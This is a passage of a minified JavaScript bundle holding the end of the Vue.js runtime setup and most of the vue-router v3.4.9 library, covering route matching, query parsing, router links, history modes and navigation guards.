this.$el.removeChild(t),this._hasMove=r.hasTransform}}}};At.config.mustUseProp=function(n,e,t){return"value"===t&&Dt(n)&&"button"!==e||"selected"===t&&"option"===n||"checked"===t&&"input"===n||"muted"===t&&"video"===n},At.config.isReservedTag=Gt,At.config.isReservedAttr=Ct,At.config.getTagNamespace=function(n){return Vt(n)?"svg":"math"===n?"math":void 0},At.config.isUnknownElement=function(n){if(!U)return!0;if(Gt(n))return!1;if(n=n.toLowerCase(),null!=Xt[n])return Xt[n];var e=document.createElement(n);return n.indexOf("-")>-1?Xt[n]=e.constructor===window.HTMLUnknownElement||e.constructor===window.HTMLElement:Xt[n]=/HTMLUnknownElement/.test(e.toString())},R(At.options.directives,ya),R(At.options.components,za),At.prototype.__patch__=U?ca:C,At.prototype.$mount=function(n,e){return function(n,e,t){var r;return n.$el=e,n.$options.render||(n.$options.render=bn),et(n,"beforeMount"),r=function(){n._update(n._render(),t)},new mt(n,r,C,{before:function(){n._isMounted&&!n._isDestroyed&&et(n,"beforeUpdate")}},!0),t=!1,null==n.$vnode&&(n._isMounted=!0,et(n,"mounted")),n}(this,n=n&&U?function(n){if("string"==typeof n){var e=document.querySelector(n);return e||document.createElement("div")}return n}(n):void 0,e)},U&&setTimeout((function(){N.devtools&&on&&on.emit("init",At)}),0);var Ca=At;
/*!
  * vue-router v3.4.9
  * (c) 2020 Evan You
  * @license MIT
  */function Da(n,e){for(var t in e)n[t]=e[t];return n}var Oa=/[!'()*]/g,Ja=function(n){return"%"+n.charCodeAt(0).toString(16)},Ma=/%2C/g,Pa=function(n){return encodeURIComponent(n).replace(Oa,Ja).replace(Ma,",")};function _a(n){try{return decodeURIComponent(n)}catch(n){0}return n}var Fa=function(n){return null==n||"object"==typeof n?n:String(n)};function Na(n){var e={};return(n=n.trim().replace(/^(\?|#|&)/,""))?(n.split("&").forEach((function(n){var t=n.replace(/\+/g," ").split("="),r=_a(t.shift()),a=t.length>0?_a(t.join("=")):null;void 0===e[r]?e[r]=a:Array.isArray(e[r])?e[r].push(a):e[r]=[e[r],a]})),e):e}function La(n){var e=n?Object.keys(n).map((function(e){var t=n[e];if(void 0===t)return"";if(null===t)return Pa(e);if(Array.isArray(t)){var r=[];return t.forEach((function(n){void 0!==n&&(null===n?r.push(Pa(e)):r.push(Pa(e)+"="+Pa(n)))})),r.join("&")}return Pa(e)+"="+Pa(t)})).filter((function(n){return n.length>0})).join("&"):null;return e?"?"+e:""}var qa=/\/?$/;function $a(n,e,t,r){var a=r&&r.options.stringifyQuery,o=e.query||{};try{o=Wa(o)}catch(n){}var i={name:e.name||n&&n.name,meta:n&&n.meta||{},path:e.path||"/",hash:e.hash||"",query:o,params:e.params||{},fullPath:Va(e,a),matched:n?Ua(n):[]};return t&&(i.redirectedFrom=Va(t,a)),Object.freeze(i)}function Wa(n){if(Array.isArray(n))return n.map(Wa);if(n&&"object"==typeof n){var e={};for(var t in n)e[t]=Wa(n[t]);return e}return n}var Ha=$a(null,{path:"/"});function Ua(n){for(var e=[];n;)e.unshift(n),n=n.parent;return e}function Va(n,e){var t=n.path,r=n.query;void 0===r&&(r={});var a=n.hash;return void 0===a&&(a=""),(t||"/")+(e||La)(r)+a}function Ga(n,e){return e===Ha?n===e:!!e&&(n.path&&e.path?n.path.replace(qa,"")===e.path.replace(qa,"")&&n.hash===e.hash&&Xa(n.query,e.query):!(!n.name||!e.name)&&(n.name===e.name&&n.hash===e.hash&&Xa(n.query,e.query)&&Xa(n.params,e.params)))}function Xa(n,e){if(void 0===n&&(n={}),void 0===e&&(e={}),!n||!e)return n===e;var t=Object.keys(n).sort(),r=Object.keys(e).sort();return t.length===r.length&&t.every((function(t,a){var o=n[t];if(r[a]!==t)return!1;var i=e[t];return null==o||null==i?o===i:"object"==typeof o&&"object"==typeof i?Xa(o,i):String(o)===String(i)}))}function Ka(n){for(var e=0;e<n.matched.length;e++){var t=n.matched[e];for(var r in t.instances){var a=t.instances[r],o=t.enteredCbs[r];if(a&&o){delete t.enteredCbs[r];for(var i=0;i<o.length;i++)a._isBeingDestroyed||o[i](a)}}}}var Ya={name:"RouterView",functional:!0,props:{name:{type:String,default:"default"}},render:function(n,e){var t=e.props,r=e.children,a=e.parent,o=e.data;o.routerView=!0;for(var i=a.$createElement,l=t.name,s=a.$route,c=a._routerViewCache||(a._routerViewCache={}),d=0,u=!1;a&&a._routerRoot!==a;){var p=a.$vnode?a.$vnode.data:{};p.routerView&&d++,p.keepAlive&&a._directInactive&&a._inactive&&(u=!0),a=a.$parent}if(o.routerViewDepth=d,u){var m=c[l],h=m&&m.component;return h?(m.configProps&&Qa(h,o,m.route,m.configProps),i(h,o,r)):i()}var f=s.matched[d],v=f&&f.components[l];if(!f||!v)return c[l]=null,i();c[l]={component:v},o.registerRouteInstance=function(n,e){var t=f.instances[l];(e&&t!==n||!e&&t===n)&&(f.instances[l]=e)},(o.hook||(o.hook={})).prepatch=function(n,e){f.instances[l]=e.componentInstance},o.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==f.instances[l]&&(f.instances[l]=n.componentInstance),Ka(s)};var g=f.props&&f.props[l];return g&&(Da(c[l],{route:s,configProps:g}),Qa(v,o,s,g)),i(v,o,r)}};function Qa(n,e,t,r){var a=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,r);if(a){a=e.props=Da({},a);var o=e.attrs=e.attrs||{};for(var i in a)n.props&&i in n.props||(o[i]=a[i],delete a[i])}}function Za(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var a=e.split("/");t&&a[a.length-1]||a.pop();for(var o=n.replace(/^\//,"").split("/"),i=0;i<o.length;i++){var l=o[i];".."===l?a.pop():"."!==l&&a.push(l)}return""!==a[0]&&a.unshift(""),a.join("/")}function no(n){return n.replace(/\/\//g,"/")}var eo=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},to=go,ro=so,ao=function(n,e){return uo(so(n,e),e)},oo=uo,io=vo,lo=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function so(n,e){for(var t,r=[],a=0,o=0,i="",l=e&&e.delimiter||"/";null!=(t=lo.exec(n));){var s=t[0],c=t[1],d=t.index;if(i+=n.slice(o,d),o=d+s.length,c)i+=c[1];else{var u=n[o],p=t[2],m=t[3],h=t[4],f=t[5],v=t[6],g=t[7];i&&(r.push(i),i="");var b=null!=p&&null!=u&&u!==p,y="+"===v||"*"===v,x="?"===v||"*"===v,E=t[2]||l,w=h||f;r.push({name:m||a++,prefix:p||"",delimiter:E,optional:x,repeat:y,partial:b,asterisk:!!g,pattern:w?mo(w):g?".*":"[^"+po(E)+"]+?"})}}return o<n.length&&(i+=n.substr(o)),i&&r.push(i),r}function co(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function uo(n,e){for(var t=new Array(n.length),r=0;r<n.length;r++)"object"==typeof n[r]&&(t[r]=new RegExp("^(?:"+n[r].pattern+")$",fo(e)));return function(e,r){for(var a="",o=e||{},i=(r||{}).pretty?co:encodeURIComponent,l=0;l<n.length;l++){var s=n[l];if("string"!=typeof s){var c,d=o[s.name];if(null==d){if(s.optional){s.partial&&(a+=s.prefix);continue}throw new TypeError('Expected "'+s.name+'" to be defined')}if(eo(d)){if(!s.repeat)throw new TypeError('Expected "'+s.name+'" to not repeat, but received `'+JSON.stringify(d)+"`");if(0===d.length){if(s.optional)continue;throw new TypeError('Expected "'+s.name+'" to not be empty')}for(var u=0;u<d.length;u++){if(c=i(d[u]),!t[l].test(c))throw new TypeError('Expected all "'+s.name+'" to match "'+s.pattern+'", but received `'+JSON.stringify(c)+"`");a+=(0===u?s.prefix:s.delimiter)+c}}else{if(c=s.asterisk?encodeURI(d).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):i(d),!t[l].test(c))throw new TypeError('Expected "'+s.name+'" to match "'+s.pattern+'", but received "'+c+'"');a+=s.prefix+c}}else a+=s}return a}}function po(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function mo(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function ho(n,e){return n.keys=e,n}function fo(n){return n&&n.sensitive?"":"i"}function vo(n,e,t){eo(e)||(t=e||t,e=[]);for(var r=(t=t||{}).strict,a=!1!==t.end,o="",i=0;i<n.length;i++){var l=n[i];if("string"==typeof l)o+=po(l);else{var s=po(l.prefix),c="(?:"+l.pattern+")";e.push(l),l.repeat&&(c+="(?:"+s+c+")*"),o+=c=l.optional?l.partial?s+"("+c+")?":"(?:"+s+"("+c+"))?":s+"("+c+")"}}var d=po(t.delimiter||"/"),u=o.slice(-d.length)===d;return r||(o=(u?o.slice(0,-d.length):o)+"(?:"+d+"(?=$))?"),o+=a?"$":r&&u?"":"(?="+d+"|$)",ho(new RegExp("^"+o,fo(t)),e)}function go(n,e,t){return eo(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var r=0;r<t.length;r++)e.push({name:r,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return ho(n,e)}(n,e):eo(n)?function(n,e,t){for(var r=[],a=0;a<n.length;a++)r.push(go(n[a],e,t).source);return ho(new RegExp("(?:"+r.join("|")+")",fo(t)),e)}(n,e,t):function(n,e,t){return vo(so(n,t),e,t)}(n,e,t)}to.parse=ro,to.compile=ao,to.tokensToFunction=oo,to.tokensToRegExp=io;var bo=Object.create(null);function yo(n,e,t){e=e||{};try{var r=bo[n]||(bo[n]=to.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),r(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function xo(n,e,t,r){var a="string"==typeof n?{path:n}:n;if(a._normalized)return a;if(a.name){var o=(a=Da({},n)).params;return o&&"object"==typeof o&&(a.params=Da({},o)),a}if(!a.path&&a.params&&e){(a=Da({},a))._normalized=!0;var i=Da(Da({},e.params),a.params);if(e.name)a.name=e.name,a.params=i;else if(e.matched.length){var l=e.matched[e.matched.length-1].path;a.path=yo(l,i,e.path)}else 0;return a}var s=function(n){var e="",t="",r=n.indexOf("#");r>=0&&(e=n.slice(r),n=n.slice(0,r));var a=n.indexOf("?");return a>=0&&(t=n.slice(a+1),n=n.slice(0,a)),{path:n,query:t,hash:e}}(a.path||""),c=e&&e.path||"/",d=s.path?Za(s.path,c,t||a.append):c,u=function(n,e,t){void 0===e&&(e={});var r,a=t||Na;try{r=a(n||"")}catch(n){r={}}for(var o in e){var i=e[o];r[o]=Array.isArray(i)?i.map(Fa):Fa(i)}return r}(s.query,a.query,r&&r.options.parseQuery),p=a.hash||s.hash;return p&&"#"!==p.charAt(0)&&(p="#"+p),{_normalized:!0,path:d,query:u,hash:p}}var Eo,wo=function(){},jo={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},exact:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,r=this.$route,a=t.resolve(this.to,r,this.append),o=a.location,i=a.route,l=a.href,s={},c=t.options.linkActiveClass,d=t.options.linkExactActiveClass,u=null==c?"router-link-active":c,p=null==d?"router-link-exact-active":d,m=null==this.activeClass?u:this.activeClass,h=null==this.exactActiveClass?p:this.exactActiveClass,f=i.redirectedFrom?$a(null,xo(i.redirectedFrom),null,t):i;s[h]=Ga(r,f),s[m]=this.exact?s[h]:function(n,e){return 0===n.path.replace(qa,"/").indexOf(e.path.replace(qa,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(r,f);var v=s[h]?this.ariaCurrentValue:null,g=function(n){Ao(n)&&(e.replace?t.replace(o,wo):t.push(o,wo))},b={click:Ao};Array.isArray(this.event)?this.event.forEach((function(n){b[n]=g})):b[this.event]=g;var y={class:s},x=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:l,route:i,navigate:g,isActive:s[m],isExactActive:s[h]});if(x){if(1===x.length)return x[0];if(x.length>1||!x.length)return 0===x.length?n():n("span",{},x)}if("a"===this.tag)y.on=b,y.attrs={href:l,"aria-current":v};else{var E=function n(e){var t;if(e)for(var r=0;r<e.length;r++){if("a"===(t=e[r]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(E){E.isStatic=!1;var w=E.data=Da({},E.data);for(var j in w.on=w.on||{},w.on){var A=w.on[j];j in b&&(w.on[j]=Array.isArray(A)?A:[A])}for(var k in b)k in w.on?w.on[k].push(b[k]):w.on[k]=g;var B=E.data.attrs=Da({},E.data.attrs);B.href=l,B["aria-current"]=v}else y.on=b}return n(this.tag,y,this.$slots.default)}};function Ao(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var ko="undefined"!=typeof window;function Bo(n,e,t,r){var a=e||[],o=t||Object.create(null),i=r||Object.create(null);n.forEach((function(n){!function n(e,t,r,a,o,i){var l=a.path,s=a.name;0;var c=a.pathToRegexpOptions||{},d=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return no(e.path+"/"+n)}(l,o,c.strict);"boolean"==typeof a.caseSensitive&&(c.sensitive=a.caseSensitive);var u={path:d,regex:So(d,c),components:a.components||{default:a.component},instances:{},enteredCbs:{},name:s,parent:o,matchAs:i,redirect:a.redirect,beforeEnter:a.beforeEnter,meta:a.meta||{},props:null==a.props?{}:a.components?a.props:{default:a.props}};a.children&&a.children.forEach((function(a){var o=i?no(i+"/"+a.path):void 0;n(e,t,r,a,u,o)}));t[u.path]||(e.push(u.path),t[u.path]=u);if(void 0!==a.alias)for(var p=Array.isArray(a.alias)?a.alias:[a.alias],m=0;m<p.length;++m){0;var h={path:p[m],children:a.children};n(e,t,r,h,o,u.path||"/")}s&&(r[s]||(r[s]=u))}(a,o,i,n)}));for(var l=0,s=a.length;l<s;l++)"*"===a[l]&&(a.push(a.splice(l,1)[0]),s--,l--);return{pathList:a,pathMap:o,nameMap:i}}function So(n,e){return to(n,[],e)}function To(n,e){var t=Bo(n),r=t.pathList,a=t.pathMap,o=t.nameMap;function i(n,t,i){var l=xo(n,t,!1,e),c=l.name;if(c){var d=o[c];if(!d)return s(null,l);var u=d.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof l.params&&(l.params={}),t&&"object"==typeof t.params)for(var p in t.params)!(p in l.params)&&u.indexOf(p)>-1&&(l.params[p]=t.params[p]);return l.path=yo(d.path,l.params),s(d,l,i)}if(l.path){l.params={};for(var m=0;m<r.length;m++){var h=r[m],f=a[h];if(Io(f.regex,l.path,l.params))return s(f,l,i)}}return s(null,l)}function l(n,t){var r=n.redirect,a="function"==typeof r?r($a(n,t,null,e)):r;if("string"==typeof a&&(a={path:a}),!a||"object"!=typeof a)return s(null,t);var l=a,c=l.name,d=l.path,u=t.query,p=t.hash,m=t.params;if(u=l.hasOwnProperty("query")?l.query:u,p=l.hasOwnProperty("hash")?l.hash:p,m=l.hasOwnProperty("params")?l.params:m,c){o[c];return i({_normalized:!0,name:c,query:u,hash:p,params:m},void 0,t)}if(d){var h=function(n,e){return Za(n,e.parent?e.parent.path:"/",!0)}(d,n);return i({_normalized:!0,path:yo(h,m),query:u,hash:p},void 0,t)}return s(null,t)}function s(n,t,r){return n&&n.redirect?l(n,r||t):n&&n.matchAs?function(n,e,t){var r=i({_normalized:!0,path:yo(t,e.params)});if(r){var a=r.matched,o=a[a.length-1];return e.params=r.params,s(o,e)}return s(null,e)}(0,t,n.matchAs):$a(n,t,r,e)}return{match:i,addRoutes:function(n){Bo(n,r,a,o)}}}function Io(n,e,t){var r=e.match(n);if(!r)return!1;if(!t)return!0;for(var a=1,o=r.length;a<o;++a){var i=n.keys[a-1];i&&(t[i.name||"pathMatch"]="string"==typeof r[a]?_a(r[a]):r[a])}return!0}var Ro=ko&&window.performance&&window.performance.now?window.performance:Date;function zo(){return Ro.now().toFixed(3)}var Co=zo();function Do(){return Co}function Oo(n){return Co=n}var Jo=Object.create(null);function Mo(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=Da({},window.history.state);return t.key=Do(),window.history.replaceState(t,"",e),window.addEventListener("popstate",Fo),function(){window.removeEventListener("popstate",Fo)}}function Po(n,e,t,r){if(n.app){var a=n.options.scrollBehavior;a&&n.app.$nextTick((function(){var o=function(){var n=Do();if(n)return Jo[n]}(),i=a.call(n,e,t,r?o:null);i&&("function"==typeof i.then?i.then((function(n){Wo(n,o)})).catch((function(n){0})):Wo(i,o))}))}}function _o(){var n=Do();n&&(Jo[n]={x:window.pageXOffset,y:window.pageYOffset})}function Fo(n){_o(),n.state&&n.state.key&&Oo(n.state.key)}function No(n){return qo(n.x)||qo(n.y)}function Lo(n){return{x:qo(n.x)?n.x:window.pageXOffset,y:qo(n.y)?n.y:window.pageYOffset}}function qo(n){return"number"==typeof n}var $o=/^#\d/;function Wo(n,e){var t,r="object"==typeof n;if(r&&"string"==typeof n.selector){var a=$o.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(a){var o=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),r=n.getBoundingClientRect();return{x:r.left-t.left-e.x,y:r.top-t.top-e.y}}(a,o={x:qo((t=o).x)?t.x:0,y:qo(t.y)?t.y:0})}else No(n)&&(e=Lo(n))}else r&&No(n)&&(e=Lo(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var Ho,Uo=ko&&((-1===(Ho=window.navigator.userAgent).indexOf("Android 2.")&&-1===Ho.indexOf("Android 4.0")||-1===Ho.indexOf("Mobile Safari")||-1!==Ho.indexOf("Chrome")||-1!==Ho.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function Vo(n,e){_o();var t=window.history;try{if(e){var r=Da({},t.state);r.key=Do(),t.replaceState(r,"",n)}else t.pushState({key:Oo(zo())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function Go(n){Vo(n,!0)}function Xo(n,e,t){var r=function(a){a>=n.length?t():n[a]?e(n[a],(function(){r(a+1)})):r(a+1)};r(0)}var Ko={redirected:2,aborted:4,cancelled:8,duplicated:16};function Yo(n,e){return Zo(n,e,Ko.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return ni.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function Qo(n,e){return Zo(n,e,Ko.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function Zo(n,e,t,r){var a=new Error(r);return a._isRouter=!0,a.from=n,a.to=e,a.type=t,a}var ni=["params","query","hash"];function ei(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function ti(n,e){return ei(n)&&n._isRouter&&(null==e||n.type===e)}function ri(n){return function(e,t,r){var a=!1,o=0,i=null;ai(n,(function(n,e,t,l){if("function"==typeof n&&void 0===n.cid){a=!0,o++;var s,c=li((function(e){var a;((a=e).__esModule||ii&&"Module"===a[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:Eo.extend(e),t.components[l]=e,--o<=0&&r()})),d=li((function(n){var e="Failed to resolve async component "+l+": "+n;i||(i=ei(n)?n:new Error(e),r(i))}));try{s=n(c,d)}catch(n){d(n)}if(s)if("function"==typeof s.then)s.then(c,d);else{var u=s.component;u&&"function"==typeof u.then&&u.then(c,d)}}})),a||r()}}function ai(n,e){return oi(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function oi(n){return Array.prototype.concat.apply([],n)}var ii="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function li(n){var e=!1;return function(){for(var t=[],r=arguments.length;r--;)t[r]=arguments[r];if(!e)return e=!0,n.apply(this,t)}}var si=function(n,e){this.router=n,this.base=function(n){if(!n)if(ko){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=Ha,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function ci(n,e,t,r){var a=ai(n,(function(n,r,a,o){var i=function(n,e){"function"!=typeof n&&(n=Eo.extend(n));return n.options[e]}(n,e);if(i)return Array.isArray(i)?i.map((function(n){return t(n,r,a,o)})):t(i,r,a,o)}));return oi(r?a.reverse():a)}function di(n,e){if(e)return function(){return n.apply(e,arguments)}}si.prototype.listen=function(n){this.cb=n},si.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},si.prototype.onError=function(n){this.errorCbs.push(n)},si.prototype.transitionTo=function(n,e,t){var r,a=this;try{r=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var o=this.current;this.confirmTransition(r,(function(){a.updateRoute(r),e&&e(r),a.ensureURL(),a.router.afterHooks.forEach((function(n){n&&n(r,o)})),a.ready||(a.ready=!0,a.readyCbs.forEach((function(n){n(r)})))}),(function(n){t&&t(n),n&&!a.ready&&(ti(n,Ko.redirected)&&o===Ha||(a.ready=!0,a.readyErrorCbs.forEach((function(e){e(n)}))))}))},si.prototype.confirmTransition=function(n,e,t){var r=this,a=this.current;this.pending=n;var o,i,l=function(n){!ti(n)&&ei(n)&&(r.errorCbs.length?r.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},s=n.matched.length-1,c=a.matched.length-1;if(Ga(n,a)&&s===c&&n.matched[s]===a.matched[c])return this.ensureURL(),l(((i=Zo(o=a,n,Ko.duplicated,'Avoided redundant navigation to current location: "'+o.fullPath+'".')).name="NavigationDuplicated",i));var d=function(n,e){var t,r=Math.max(n.length,e.length);for(t=0;t<r&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),u=d.updated,p=d.deactivated,m=d.activated,h=[].concat(function(n){return ci(n,"beforeRouteLeave",di,!0)}(p),this.router.beforeHooks,function(n){return ci(n,"beforeRouteUpdate",di)}(u),m.map((function(n){return n.beforeEnter})),ri(m)),f=function(e,t){if(r.pending!==n)return l(Qo(a,n));try{e(n,a,(function(e){!1===e?(r.ensureURL(!0),l(function(n,e){return Zo(n,e,Ko.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(a,n))):ei(e)?(r.ensureURL(!0),l(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(l(Yo(a,n)),"object"==typeof e&&e.replace?r.replace(e):r.push(e)):t(e)}))}catch(n){l(n)}};Xo(h,f,(function(){Xo(function(n){return ci(n,"beforeRouteEnter",(function(n,e,t,r){return function(n,e,t){return function(r,a,o){return n(r,a,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),o(n)}))}}(n,t,r)}))}(m).concat(r.router.resolveHooks),f,(function(){if(r.pending!==n)return l(Qo(a,n));r.pending=null,e(n),r.router.app&&r.router.app.$nextTick((function(){Ka(n)}))}))}))},si.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},si.prototype.setupListeners=function(){},si.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=Ha,this.pending=null};var ui=function(n){function e(e,t){n.call(this,e,t),this._startLocation=pi(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,r=Uo&&t;r&&this.listeners.push(Mo());var a=function(){var t=n.current,a=pi(n.base);n.current===Ha&&a===n._startLocation||n.transitionTo(a,(function(n){r&&Po(e,n,t,!0)}))};window.addEventListener("popstate",a),this.listeners.push((function(){window.removeEventListener("popstate",a)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Vo(no(r.base+n.fullPath)),Po(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){Go(no(r.base+n.fullPath)),Po(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(pi(this.base)!==this.current.fullPath){var e=no(this.base+this.current.fullPath);n?Vo(e):Go(e)}},e.prototype.getCurrentLocation=function(){return pi(this.base)},e}(si);function pi(n){var e=window.location.pathname;return n&&0===e.toLowerCase().indexOf(n.toLowerCase())&&(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var mi=function(n){function e(e,t,r){n.call(this,e,t),r&&function(n){var e=pi(n);if(!/^\/#/.test(e))return window.location.replace(no(n+"/#"+e)),!0}(this.base)||hi()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=Uo&&e;t&&this.listeners.push(Mo());var r=function(){var e=n.current;hi()&&n.transitionTo(fi(),(function(r){t&&Po(n.router,r,e,!0),Uo||bi(r.fullPath)}))},a=Uo?"popstate":"hashchange";window.addEventListener(a,r),this.listeners.push((function(){window.removeEventListener(a,r)}))}},e.prototype.push=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){gi(n.fullPath),Po(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,a=this.current;this.transitionTo(n,(function(n){bi(n.fullPath),Po(r.router,n,a,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;fi()!==e&&(n?gi(e):bi(e))},e.prototype.getCurrentLocation=function(){return fi()},e}(si);function hi(){var n=fi();return"/"===n.charAt(0)||(bi("/"+n),!1)}function fi(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function vi(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function gi(n){Uo?Vo(vi(n)):window.location.hash=n}function bi(n){Uo?Go(vi(n)):window.location.replace(vi(n))}var yi=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index+1).concat(n),r.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var r=this.stack[t];this.confirmTransition(r,(function(){var n=e.current;e.index=t,e.updateRoute(r),e.router.afterHooks.forEach((function(e){e&&e(r,n)}))}),(function(n){ti(n,Ko.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(si),xi=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=To(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!Uo&&!1!==n.fallback,this.fallback&&(e="hash"),ko||(e="abstract"),this.mode=e,e){case"history":this.history=new ui(this,n.base);break;case"hash":this.history=new mi(this,n.base,this.fallback);break;case"abstract":this.history=new yi(this,n.base);break;default:0}},Ei={currentRoute:{configurable:!0}};function wi(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}xi.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},Ei.currentRoute.get=function(){return this.history&&this.history.current},xi.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof ui||t instanceof mi){var r=function(n){t.setupListeners(),function(n){var r=t.current,a=e.options.scrollBehavior;Uo&&a&&"fullPath"in n&&Po(e,n,r,!1)}(n)};t.transitionTo(t.getCurrentLocation(),r,r)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},xi.prototype.beforeEach=function(n){return wi(this.beforeHooks,n)},xi.prototype.beforeResolve=function(n){return wi(this.resolveHooks,n)},xi.prototype.afterEach=function(n){return 